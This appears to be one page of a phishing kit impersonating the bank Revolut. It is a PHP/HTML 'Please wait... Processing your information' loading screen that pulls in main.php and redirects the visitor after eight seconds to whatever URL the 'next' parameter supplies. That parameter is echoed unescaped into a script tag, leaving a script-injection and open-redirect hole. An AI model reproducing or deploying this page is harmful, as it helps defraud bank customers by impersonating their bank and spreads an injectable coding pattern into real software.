<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Revolut</title>
</head>
<body>
<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>

<main>
<div class="for">


<div class="container">

<h2>Please wait...</h2>
<p>Processing your information...</p>
<p><img src="res/img/lodding.gif" style="width:60px;"></p>
 

</div>
</div>
</main>

 

 


<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>